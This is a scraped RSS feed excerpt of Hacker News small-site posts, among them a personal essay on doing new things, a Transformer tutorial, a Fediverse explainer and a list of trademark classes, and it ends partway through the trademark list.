<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>I’ve written about <a href="http://www.benkuhn.net/exploration" target="_blank">exploration and exploitation</a> before, but I realized recently that this may be more important than I thought. Talking to a friend about what different people thought about what role effort vs. innate ability played in success, I went down my list of successes and ended up realizing that the only “difficult” part (in the sense of “part I was closest to not doing”) was actually getting up and doing things outside my normal routine.</p><p>For example, here’s a list of the things that have led to my biggest wins so far:</p><ul><li>trying out contra dancing in middle school</li><li>joining <a href="http://harvardhip.org/" target="_blank">Harvard High-Impact Philanthropy</a></li><li>interning at Fog Creek Software</li><li>being president of HHIP</li><li>starting <a href="http://harvard-class.com/" target="_blank">Harvard Class</a></li><li>starting a blog</li><li>going to a <a href="http://rationality.org/" target="_blank">CFAR</a> workshop</li><li>going to the <a href="http://www.effectivealtruismsummit.com/" target="_blank">EA summit</a></li><li>running an <a href="http://harvardhip.org/events/" target="_blank">EA speaker series</a> this semester</li></ul><p>I’d say these were about 25% effort, 25% ability, and 50% “luck” from doing lots of things outside my normal experience.</p><p>At a guess, the reason doing lots of different things is so important is that it simply exposes you to more potential random “strokes of luck”. When you do a thing, often lots of the exposure to luck comes from the first relatively small bit of effort you put in. For instance, if I turned out not to like contra dancing, I could have stopped going, so it was a pretty small cost for a large potential upside.</p><p>This stuff compounds, too. The more you do stuff, the more “luck” you get, which helps you do more stuff, etc. In other words, it seems like the main factor in success is a <a href="http://en.wikipedia.org/wiki/Preferential_attachment" target="_blank">preferential attachment</a> process, which explains why there’s such a power-law distribution and why similar people often end up with such wildly different outcomes: relatively small differences in initial conditions, caused by noise, can blow up to huge effects later.</p><p>Notes on this theory:</p><ol><li>Some predictions: people who experience more different things will ceteris paribus succeed more. For example, for college graduates, life outcomes later will be correlated with diversity of the things they did over their summers. Success might be correlated with number of different places you lived growing up (there are lots of confounders here of course). A supporting piece of evidence here is <a href="http://www.benkuhn.net/satvik" target="_blank">Satvik’s assertion</a> to me that “Statistically, CEOs of large companies tend to have worked in multiple areas during their early career at a rate far higher than baseline.”</li><li>I’d guess that the preferential attachment process starts gaining significance almost as soon as the person starts getting agency, which can be as early as, I don’t know, three or four? There’s a famous story about Elon Musk when he was maybe six years old and loved to go visit his cousin who lived across town. One day he was grounded and his parents wouldn’t take him to visit his cousin, so he escaped and wandered around the town himself until he found his cousin’s house. That’s the kind of doing-things-ness that can compound ridiculously.</li><li>I think I’m probably better (comparatively) at Actually Doing Things than I am at putting in effort, but that even still, the returns from spending more attention on Actually Doing Things are probably higher than spending that attention on putting in effort. Unfortunately, this is hard to convince myself of in a way that actually compels me to act, for reasons I’ve mentioned <a href="http://www.benkuhn.net/exploration" target="_blank">previously</a>.</li><li>If this theory is true, it has some implications for my behavior: I should be spending less time on classes, taking more variety of classes (this will be easier in the future as I’ve basically finished my major), try to get rid of my most time-consuming commitments (e.g. get someone else to run HHIP next year), and generally say “yes” to more things. <del>The college</del> Harvard’s environment is set up pretty poorly for this, inasmuch as I have to spend 20-30 hours a week thinking about math.</li></ol></article></div>]]>
            </description>
            <link>https://www.benkuhn.net/actually-doing-things/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539262</guid>
            <pubDate>Mon, 21 Sep 2020 02:40:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding the Transformer Architecture]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539169">thread link</a>) | @rahulagwl
<br/>
September 20, 2020 | https://mlwhiz.com/blog/2020/09/20/transformers/ | <a href="https://web.archive.org/web/*/https://mlwhiz.com/blog/2020/09/20/transformers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Transformers have become the defacto standard for NLP tasks nowadays.</p>
<p>While the Transformer architecture was introduced with NLP, they are now being used in Computer Vision and to generate music as well. I am sure you would all have heard about the GPT3 Transformer and its applications thereof.</p>
<p><em><strong>But all these things aside, they are still hard to understand as ever.</strong></em></p>
<p>It has taken me multiple readings through the Google research <a href="https://arxiv.org/pdf/1706.03762.pdf">paper</a> that first introduced transformers along with just so many blog posts to really understand how a transformer works.</p>
<p>So, I thought of putting the whole idea down in as simple words as possible and with some very basic Math and some puns as I am a proponent of having some fun while learning. I will try to keep both the jargon and the technicality to a minimum, yet it is such a topic that I could only do so much. And my goal is to make the reader understand even the most gory details of Transformer by the end of this post.</p>
<p><em><strong>Also, this is officially my longest post both in terms of time taken to write it as well as length of the post. Hence, I will advice you to Grab A Coffee.</strong></em> ☕️</p>
<p>So, here goes — This post will be a highly conversational one and it is about “<em><strong>Decoding The Transformer”.</strong></em></p>
<hr>
<p><em><strong>Q: So, Why should I even understand Transformer?</strong></em></p>
<p>In the past, the LSTM and GRU architecture(as explained here in my past <a href="https://towardsdatascience.com/nlp-learning-series-part-3-attention-cnn-and-what-not-for-text-classification-4313930ed566">post</a> on NLP) along with attention mechanism used to be the State of the Art Approach for Language modeling problems (put very simply, predict the next word) and Translation systems. But, the main problem with these architectures is that they are recurrent in nature, and the runtime increases as the sequence length increases. That is, these architectures take a sentence and process each word in a <em><strong>sequential</strong></em> way, and hence with the increase in sentence length the whole runtime increases.</p>
<p>Transformer, a model architecture first explained in the paper Attention is all you need, lets go of this recurrence and instead relies entirely on an attention mechanism to draw global dependencies between input and output. And that makes it FAST.</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/0.png" alt="<a href=&quot;https://arxiv.org/pdf/1706.03762.pdf&quot;>Source</a>">
<figcaption>From the Paper</figcaption>
</figure>

<p>This is the picture of the full transformer as taken from the paper. And, it surely is intimidating. So, I will aim to demystify it in this post by going through each individual piece. So read ahead.</p>
<hr>
<h2 id="the-big-picture">The Big Picture</h2>
<p><em><strong>Q: That sounds interesting. So, what does a transformer do exactly?</strong></em></p>
<p>Essentially, a transformer can perform almost any NLP task. It can be used for language modeling, Translation, or Classification as required, and it does it fast by removing the sequential nature of the problem. So, the transformer in a machine translation application would convert one language to another, or for a classification problem will provide the class probability using an appropriate output layer.</p>
<p>It all will depend on the final outputs layer for the network but, the Transformer basic structure will remain quite the same for any task. For this particular post, I will be continuing with the machine translation example.</p>
<p>So from a very high place, this is how the transformer looks for a translation task. It takes as input an English sentence and returns a German sentence.</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/1.png" alt="Transformer for Translation">
<figcaption>Transformer for Translation</figcaption>
</figure>

<hr>
<h2 id="the-building-blocks">The Building Blocks</h2>
<p><em><strong>Q: That was too basic. <em>😎</em> Can you expand on it?</strong></em></p>
<p>Okay, just remember in the end, you asked for it. Let’s go a little deeper and try to understand what a transformer is composed of.</p>
<p>So, a transformer is essentially composed of a stack of encoder and decoder layers. The role of an encoder layer is to encode the English sentence into a numerical form using the attention mechanism, while the decoder aims to use the encoded information from the encoder layers to give the German translation for the particular English sentence.</p>
<p>In the figure below, the transformer is given as input an English sentence, which gets encoded using 6 encoder layers. The output from the final encoder layer then goes to each decoder layer to translate English to German.</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/2.png" alt="Data Flow in a Transformer">
<figcaption>Data Flow in a Transformer</figcaption>
</figure>

<hr>
<h2 id="1-encoder-architecture">1. Encoder Architecture</h2>
<p><em><strong>Q: That’s alright but, how does an encoder stack encode an English sentence exactly?</strong></em></p>
<p>Patience, I am getting to it. So, as I said the encoder stack contains six encoder layers on top of each other(As given in the paper, but the future versions of transformers use even more layers). And each encoder in the stack has essentially two main layers:</p>
<ul>
<li>
<p><strong>a multi-head self-attention Layer, and</strong></p>
</li>
<li>
<p><strong>a position-wise fully connected feed-forward network</strong></p>
</li>
</ul>
<figure>
<img src="https://mlwhiz.com/images/transformers/3.png" alt="Very basic encoder Layer">
<figcaption>Very basic encoder Layer</figcaption>
</figure>

<p>They are a mouthful. Right? Don’t lose me yet as I will explain both of them in the coming sections. Right now, just remember that the encoder layer incorporates attention and a position-wise feed-forward network.</p>
<p><em><strong>Q: But, how does this layer expect its inputs to be?</strong></em></p>
<p>This layer expects its inputs to be of the shape <code>SxD</code> (as shown in the figure below) where <code>S</code> is the source sentence(English Sentence) length, and <code>D</code> is the dimension of the embedding whose weights can be trained with the network. In this post, we will be using D as 512 by default throughout. While S will be the maximum length of sentence in a batch. So it normally changes with batches.</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/4.png" alt="Encoder — Input and Output shapes are the same">
<figcaption>Encoder — Input and Output shapes are the same</figcaption>
</figure>

<p>And what about the outputs of this layer? Remember that the encoder layers are stacked on top of each other. So, we want to be able to have an output of the same dimension as the input so that the output can flow easily into the next encoder. So the output is also of the shape, <code>SxD</code>.</p>
<p><em><strong>Q: Enough about the sizes talk, I understand what goes in and what goes out but what actually happens in the Encoder layer?</strong></em></p>
<p>Okay, let’s go through the attention layer and the feedforward layer one by one:</p>
<h3 id="a-self-attention-layer">A) Self-attention layer</h3>
<figure>
<img src="https://mlwhiz.com/images/transformers/5.png" alt="How Self-Attention Works">
<figcaption>How Self-Attention Works</figcaption>
</figure>

<p>The above figure must look daunting but it is easy to understand. So just stay with me here.</p>
<p>Deep Learning is essentially nothing but a lot of matrix calculations and what we are essentially doing in this layer is a lot of matrix calculations intelligently. The self-attention layer initializes with 3 weight matrices — Query($W_q$), Key($W_k$), and Value($W_v$). Each of these matrices has a size of (<code>Dxd</code>) where d is taken as 64 in the paper. The weights for these matrices will be trained when we train the model.</p>
<p>In the first calculation(Calc 1 in the figure), we create matrices Q, K, and V by multiplying the input with the respective Query, Key, and Value matrix.</p>
<p>Till now it is trivial and shouldn’t make any sense, but it is at the second calculation where it gets interesting. Let’s try to understand the output of the softmax function. We start by multiplying the Q and Kᵀ matrix to get a matrix of size (<code>SxS</code>) and divide it by the scalar √d. We then take a softmax to make the rows sum to one.</p>
<p>Intuitively, we can think of the resultant <code>SxS</code> matrix as the contribution of each word in another word. For example, it might look like this:</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/6.png" alt="Softmax(QxKt/sqrt(d))">
<figcaption>After Softmax</figcaption>
</figure>

<p>As you can see the diagonal entries are big. This is because the word contribution to itself is high. That is reasonable. But we can see here that the word “quick” devolves into “quick” and “fox” and the word “brown” also devolves into “brown” and “fox”. That intuitively helps us to say that both the words — “quick” and “brown” each refers to the “fox”.</p>
<p>Once we have this SxS matrix with contributions we multiply this matrix by the Value matrix(Sxd) of the sentence and it gives us back a matrix of shape Sxd(4x64). So, what the operation actually does is that it replaces the embedding vector of a word like “quick” with say .75 x (quick embedding) and .2x(fox embedding) and thus now the resultant output for the word “quick” has attention embedded in itself.</p>
<p>Note that the output of this layer has the dimension (Sxd) and before we get done with the whole encoder we need to change it back to D=512 as we need the output of this encoder as the input of another encoder.</p>
<p><em><strong>Q: But, you called this layer Multi-head self-attention Layer. What is the multi-head?</strong></em></p>
<p>Okay, my bad but in my defense, I was just getting to that.</p>
<p>It’s called a multi-head because we use many such self-attention layers in parallel. That is, we have many self-attention layers stacked on top of each other. The number of attention layers,h, is kept as 8 in the paper. So the input X goes through many self-attention layers parallelly, each of which gives a z matrix of shape (Sxd) = 4x64. We concatenate these 8(h) matrices and again apply a final output linear layer, $W_o$, of size DxD.</p>
<p>What size do we get? For the concatenate operation we get a size of SxD(4x(64x8) = 4x512). And multiplying this output by $W_o$, we get the final output Z with the shape of SxD(4x512) as desired.</p>
<p>Also, note the relation between h,d, and D i.e. h x d = D</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/7.png" alt="The Full multi-headed self-attention Layer">
<figcaption>The Full multi-headed self-attention Layer</figcaption>
</figure>

<p>Thus, we finally get the output Z of shape 4x512 as intended. But before it goes into another encoder we pass it through a Feed-Forward Network.</p>
<h3 id="b-position-wise-feed-forward-network">B) Position-wise feed-forward network</h3>
<p>Once we understand the multi-headed attention layer, the Feed-forward network is actually pretty easy to understand. It is just a combination of various linear and dropout layers on the output Z. Consequentially, it is again just a lot of Matrix multiplication here.</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/8.png" alt="Each word goes into the feed-forward network.">
<figcaption>Each word goes into the feed-forward network</figcaption>
</figure>

<p>The feed-forward network applies itself to each position in the output Z parallelly(Each position can be thought of as a word) and hence the name Position-wise feed-forward network. The feed-forward network also shares weight, so that the length of the source sentence doesn’t matter(Also, if it didn’t share weights, we would have to initialize a lot of such networks based on max source sentence length and that is not feasible)</p>
<figure>
<img src="https://mlwhiz.com/images/transformers/9.png" alt="It is actually just a linear layer that gets applied to each position(or word)">
<figcaption>It is actually just a linear layer that gets applied to each position(or word)</figcaption>
</figure>

<p>With this, we near an okayish understanding of the encoder part of the Transformer.</p>
<p><em><strong>Q: Hey, I was just going through the picture in the paper, and the encoder stack has something …</strong></em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mlwhiz.com/blog/2020/09/20/transformers/">https://mlwhiz.com/blog/2020/09/20/transformers/</a></em></p>]]>
            </description>
            <link>https://mlwhiz.com/blog/2020/09/20/transformers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539169</guid>
            <pubDate>Mon, 21 Sep 2020 02:23:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is the Fediverse? Briefly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24538962">thread link</a>) | @torresjrjr
<br/>
September 20, 2020 | https://torresjrjr.com/archive/2020-07-20-what-is-the-fediverse | <a href="https://web.archive.org/web/*/https://torresjrjr.com/archive/2020-07-20-what-is-the-fediverse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>

<header id="Title">
  
  
  <time>2020-07-20</time>
</header>

<p><small> See also: <a href="https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse"><em>full guide version</em></a> </small></p>
<p>Say you have a Twitter account 🐦, <code>@alice</code>. Your friends Bob and Charlie have Twitter accounts too, <code>@bob</code> and <code>@charlie</code>. You can talk seamlessly to each other, but <em>only</em> on <code>twitter.com</code> and nowhere else. Bad.</p>
<p>Now, you have an email account 📧, <code>alice@gmail.com</code>. Your friends Bob and Charlie also have email accounts, <code>bob@hotmail.com</code> and <code>charlie@yahoo.com</code>. You all can talk from different websites. Great, but email sucks as social media.</p>
<p>Now, imagine this. You have a Fediverse account 🌟, <code>@alice@tweet.com</code>. Your friends Bob and Charlie also have Fediverse accounts, <code>@bob@toot.net</code> and <code>@charlie@social.org</code>. <strong>You all can talk seamlessly like Twitter, from anywhere like email.</strong> That’s the Fediverse, and it’s amazing.</p>
<figure>
<img src="https://upload.wikimedia.org/wikipedia/commons/9/93/Fediverse_logo_proposal.svg" height="128" alt="Unofficial Fediverse logo">
</figure>
<h2 id="what-does-it-look-like">What does it look like?</h2>
<p>Like this. Microblogging, video sharing, photo sharing… And these Fediverse websites are <strong>all interconnected</strong>.</p>
<figure>
<img src="https://i.imgur.com/MDoyecc.png" alt="Mastodon, Pleroma, and PeerTube. All interconnected.">
</figure>
<p>Here’s an example of Fediverse accounts “tweeting” to each other across different websites. Talk to anyone, anywhere.</p>
<figure>
<img src="https://i.imgur.com/zdG7B0k.png" alt="A post and reply on Mastodon. Notice the handles in red.">
</figure>
<p>No more being tied down to a single place which abuses their power or your data. You decide were you reside.</p>
<h2 id="how-do-i-join">How do I join?</h2>
<p>Easiest way is to sign up to a <a href="https://joinmastodon.org/">Mastodon</a> instance (website/server) of your choice. If you’re feeling adventurous, browse <a href="https://fediverse.network/">Fediverse.network</a> for other Fediverse instances, including non-Mastodon ones. Remember, <strong>you can talk to anyone anywhere regardless of where they are on the Fediverse!</strong></p>
<figure>
<img src="https://i.imgur.com/EIlnJXc.png" alt="Pick a Mastodon instance and browse the Fediverse.">
</figure>
<h2 id="is-there-more-than-just-microblogging">Is there more than just microblogging?</h2>
<p>Yes, plenty! Check out <a href="https://fediverse.party/">Fediverse.party</a> for a cool interactive guide. The Fediverse is a whole family of miraculously <strong>interconnected</strong> (federated) services.</p>
<ul>
<li><a href="https://joinmastodon.org/">Mastodon</a> - Microblogging. The most popular service and Twitter alt.</li>
<li><a href="https://pleroma.com/">Pleroma</a> - Microblogging. A more lightweight, customisable alt.</li>
<li><a href="https://joinpeertube.org/">PeerTube</a> - Video streaming. YouTube alt.</li>
<li><a href="https://funkwhale.audio/">Funkwhale</a> - Audio streaming. Spotify alt.</li>
<li><a href="https://beta.joinpixelfed.org/">Pixelfed</a> - Photo sharing. Instagram alt.</li>
<li><a href="https://friendi.ca/">Friendica</a> - Microblogging+. Facebook alt.</li>
<li><a href="https://write.as/">Write.as</a> - Federated blogging.</li>
<li><a href="https://joinplu.me/">Plume</a> - Federated blogging.</li>
<li>And many more.</li>
</ul>
<h2 id="why-should-i-join">Why should I join?</h2>
<p>It’s no surprise nobody trust the big monster tech giants (Twitter, Facebook, YouTube, etc.) anymore. Why wait until the next case of them abusing your data, keeping permanent records, censoring arbitrarily, and manipulating your feed, when there is a better, thriving alternative? There’s no need to be kept shackled within their walled gardens.</p>
<figure>
<img src="https://i.imgur.com/qIttu4i.png" alt="Greedy big tech profiting from your ignorance.">
</figure>
<p>The Fediverse offers real internet <em>freedom</em>, and it’s come a long way since it’s beginnings. Sometimes you don’t value something until it’s truly gone. So don’t wait! Don’t miss out on this special internet subculture. <a href="https://joinmastodon.org/">Join</a> one of the thousands of thriving communities and get talking. It won’t hurt to sign up. We’re all waiting here for you!</p>
<p>Read <a href="https://write.as/eloquence/why-mastodon-and-the-fediverse-are-doomed-to-fail">eloquence’s article</a> for a sober take.</p>
<hr>
<p>Want to learn more? I wrote a simple <a href="https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse"><em>Guide to the Fediverse</em></a>.</p>
<p>Or watch this great explanatory video.</p>

<p>Here’s a proper definition of the Fediverse.</p>
<blockquote>
<p>The <strong>Fediverse</strong> (federated + universe) is the decentralised social media network of federated (independent &amp; interconnected) servers, communicating via open protocols, especially ActivityPub.<br>
– <a href="https://en.wiktionary.org/wiki/Fediverse"><em>Wiktionary</em></a>, modified.</p>
</blockquote>
<p>OK now, go join the Fediverse, and enjoy internet freedom!</p>
<hr>
<p><small> Comments: <a href="https://qoto.org/@torresjrjr/104865046295137278">Fediverse</a></small></p><small>
<p><a href="https://torresjrjr.com/links#contact">Contribute</a>. Note, this article aims to explain the gist of the Fediverse to people unfamiliar with technology, not to be a comprehensive or technical overview.</p>
</small><p><small><em>Last updated: 2020 September 21th</em> </small></p>

  </article>
</div></div>]]>
            </description>
            <link>https://torresjrjr.com/archive/2020-07-20-what-is-the-fediverse</link>
            <guid isPermaLink="false">hacker-news-small-sites-24538962</guid>
            <pubDate>Mon, 21 Sep 2020 01:38:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Commons – Simple mini-forums for communities]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24538774">thread link</a>) | @kthez
<br/>
September 20, 2020 | https://www.startcommons.com/634fcf24-7448-4ac3-b393-35f52699dc23 | <a href="https://web.archive.org/web/*/https://www.startcommons.com/634fcf24-7448-4ac3-b393-35f52699dc23">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.startcommons.com/634fcf24-7448-4ac3-b393-35f52699dc23</link>
            <guid isPermaLink="false">hacker-news-small-sites-24538774</guid>
            <pubDate>Mon, 21 Sep 2020 00:58:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Are Trademark Classes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24538359">thread link</a>) | @FoxtelMan
<br/>
September 20, 2020 | https://www.legallyinsightful.com/2020/09/what-are-trademark-classes.html | <a href="https://web.archive.org/web/*/https://www.legallyinsightful.com/2020/09/what-are-trademark-classes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div id="post-body-2784187417912761080">
<p>&nbsp;<span>What are Trademark Classes</span></p><p><span data-preserver-spaces="true">When you are registering a trademark, it is essential to think about what the kind of classes of object/services you want your trademark to apply to.  The World Intellectual Property Organization (WIPO) has designated 45 classes in which you can register a trademark. Classes 1-34 are for goods that you may produce (like food or technology) and classes 35-45 are for services (like legal or medical services). This is known as the Nice International Classification of Goods and Services and has been the method of classifying what areas a trademark is registered in over 85 countries, including Australia.&nbsp;</span></p><p><span data-preserver-spaces="true">How to pick a class?</span></p><p><span data-preserver-spaces="true">When you a completing a trademark application, you must determine precisely what bounds you wish you apply to your trademark. An application for a trademark is likely to be rejected if you set the bounds to be too big and ineffective if you set the bounds to be too small. There is a sweet spot which you must find. But it is essential to keep in mind that trademark protection extends only so far as is specified in the application if your trademark application includes a particular class or service you are not necessarily guaranteed protection for every item in that class or service.&nbsp;&nbsp;</span></p><p><strong>What are the Classes</strong></p><p><strong>Trademark Classes 1.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Chemicals used in industry, science and photography, as well as in agriculture, horticulture and forestry; unprocessed artificial resins, unprocessed plastics; manures; fire extinguishing compositions; tempering and soldering preparations; chemical substances for preserving foodstuffs; tanning substances; adhesives used in industry.</span></p><p><strong>Trademark Classes 2.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Paints, varnishes, lacquers; preservatives against rust and against deterioration of wood; colourants; mordants; raw natural resins; metals in foil and powder form for painters, decorators, printers and artists.</span></p><p><strong>Trademark Classes 3.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Bleaching preparations and other substances for laundry use; cleaning, polishing, scouring and abrasive preparations; soaps; perfumery, essential oils, cosmetics, hair lotions; dentifrices.</span></p><p><strong>Trademark Classes 4.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Industrial oils and greases; lubricants; dust absorbing, wetting and binding compositions; fuels (including motor spirit) and illuminants; candles and wicks for lighting.</span></p><p><strong>Trademark Classes 5.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Pharmaceutical and veterinary preparations; sanitary preparations for medical purposes; dietetic food and substances adapted for medical or veterinary use, food for babies; dietary supplements for humans and animals; plasters, materials for dressings; material for stopping teeth, dental wax; disinfectants; preparations for destroying vermin; fungicides, herbicides.</span></p><p><strong>Trademark Classes 6.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Common metals and their alloys; metal building materials; transportable buildings of metal; materials of metal for railway tracks; non-electric cables and wires of common metal; ironmongery, small items of metal hardware; pipes and tubes of metal; safes; goods of common metal not included in other classes; ores.</span></p><p><strong>Trademark Classes 7.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Machines and machine tools; motors and engines (except for land vehicles); machine coupling and transmission components (except for land vehicles); agricultural implements other than hand-operated; incubators for eggs; automatic vending machines.</span></p><p><strong>Trademark Classes 8.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Hand tools and implements (hand-operated); cutlery; side arms; razors.</span></p><p><strong>Trademark Classes 9.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Scientific, nautical, surveying, photographic, cinematographic, optical, weighing, measuring, signalling, checking (supervision), life-saving and teaching apparatus and instruments; apparatus and instruments for conducting, switching, transforming, accumulating, regulating or controlling electricity; apparatus for recording, transmission or reproduction of sound or images; magnetic data carriers, recording discs; compact discs, DVDs and other digital recording media; mechanisms for coin-operated apparatus; cash registers, calculating machines, data processing equipment, computers; computer software; fire-extinguishing apparatus.</span></p><p><strong>Trademark Classes 10.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Surgical, medical, dental and veterinary apparatus and instruments, artificial limbs, eyes and teeth; orthopedic articles; suture materials.</span></p><p><strong>Trademark Classes 11.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Apparatus for lighting, heating, steam generating, cooking, refrigerating, drying, ventilating, water supply and sanitary purposes.</span></p><p><strong>Trademark Classes 12.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Vehicles; apparatus for locomotion by land, air or water.</span></p><p><strong>Trademark Classes 13.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Firearms; ammunition and projectiles; explosives; fireworks.</span></p><p><strong>Trademark Classes 14.</strong><span data-preserver-spaces="true">&nbsp;Precious metals and their alloys and goods in precious metals or coated therewith, not included in other classes; jewellery, precious stones; horological and chronometric instruments.</span></p><p><strong>Trademark Classes 15.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Musical instruments.</span></p><p><strong>Trademark Classes 16.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Paper, cardboard and goods made from these materials, not included in other classes; printed matter; bookbinding material; photographs; stationery; adhesives for stationery or household purposes; artists’ materials; paintbrushes; typewriters and office requisites (except furniture); instructional and teaching material (except apparatus); plastic materials for packaging (not included in other classes); printers’ type; printing blocks.</span></p><p><strong>Trademark Classes 17.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Rubber, gutta-percha, gum, asbestos, mica and goods made from these materials and not included in other classes; plastics in extruded form for use in manufacture; packing, stopping and insulating materials; flexible pipes, not of metal.</span></p><p><strong>Trademark Classes 18.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Leather and imitations of leather, and goods made of these materials and not included in other classes; animal skins, hides; trunks and travelling bags; umbrellas and parasols; walking sticks; whips, harness and saddlery.</span></p><p><strong>Trademark Classes 19.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Building materials (non-metallic); non-metallic rigid pipes for building; asphalt, pitch and bitumen; non-metallic transportable buildings; monuments, not of metal.</span></p><p><strong>Trademark Classes 20.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Furniture, mirrors, picture frames; goods (not included in other classes) of wood, cork, reed, cane, wicker, horn, bone, ivory, whalebone, shell, amber, mother-of-pearl, meerschaum and substitutes for all these materials, or of plastics.</span></p><p><strong>Trademark Classes 21.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Household or kitchen utensils and containers; combs and sponges; brushes (except paint brushes); brush-making materials; articles for cleaning purposes; steelwool; unworked or semi-worked glass (except glass used in building); glassware, porcelain and earthenware not included in other classes.</span></p><p><strong>Trademark Classes 22.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Ropes, string, nets, tents, awnings, tarpaulins, sails, sacks and bags (not included in other classes); padding and stuffing materials (except of rubber or plastics); raw fibrous textile materials.</span></p><p><strong>Trademark Classes 23.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Yarns and threads, for textile use.</span></p><p><strong>Trademark Classes 24.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Textiles and textile goods, not included in other classes; bed covers; table covers.</span></p><p><strong>Trademark Classes 25.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Clothing, footwear, headgear.</span></p><p><strong>Trademark Classes 26.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Lace and embroidery, ribbons and braid; buttons, hooks and eyes, pins and needles; artificial flowers.</span></p><p><strong>Trademark Classes 27.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Carpets, rugs, mats and matting, linoleum and other materials for covering existing floors; wall hangings (non-textile).</span></p><p><strong>Trademark Classes 28.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Games and playthings; gymnastic and sporting articles not included in other classes; decorations for Christmas trees.</span></p><p><strong>Trademark Classes 29.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Meat, fish, poultry and game; meat extracts; preserved, dried and cooked fruits and vegetables; jellies, jams, compotes; eggs; milk and milk products; edible oils and fats.</span></p><p><strong>Trademark Classes 30.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Coffee, tea, cocoa and artificial coffee; rice; tapioca and sago; flour and preparations made from cereals; bread, pastry and confectionery; edible ices; sugar, honey, treacle; yeast, baking-powder; salt; mustard; vinegar, sauces (condiments); spices; ice.</span></p><p><strong>Trademark Classes 31.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Grains and agricultural, horticultural and forestry products and grains not included in other classes; live animals; fresh fruits and vegetables; seeds; natural plants and flowers; foodstuffs for animals, malt.</span></p><p><strong>Trademark Classes 32.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Beers; mineral and aerated waters and other non-alcoholic beverages; fruit beverages and fruit juices; syrups and other preparations for making beverages.</span></p><p><strong>Trademark Classes 33.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Alcoholic beverages (except beers).</span></p><p><strong>Trademark Classes 34.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Tobacco; smokers’ articles; matches.</span></p><p><strong>Trademark Classes 35.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Advertising; business management; business administration; office functions.</span></p><p><strong>Trademark Classes 36.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Insurance; financial affairs; monetary affairs; real estate affairs.</span></p><p><strong>Trademark Classes 37.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Building construction; repair; installation services.</span></p><p><strong>Trademark Classes 38.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Telecommunications.</span></p><p><strong>Trademark Classes 39.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Transport; packaging and storage of goods; travel arrangement.</span></p><p><strong>Trademark Class 40.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Treatment of materials.</span></p><p><strong>Trademark Classes 41.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Education; providing of training; entertainment; sporting and cultural activities.</span></p><p><strong>Trademark Classes 42.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Scientific and technological services and research and design relating thereto; industrial analysis and research services; design and development of computer hardware and software.</span></p><p><strong>Trademark Classes 43.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Services for providing food and drink; temporary accommodation.</span></p><p><strong>Trademark Class 44.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Medical services; veterinary services; hygienic 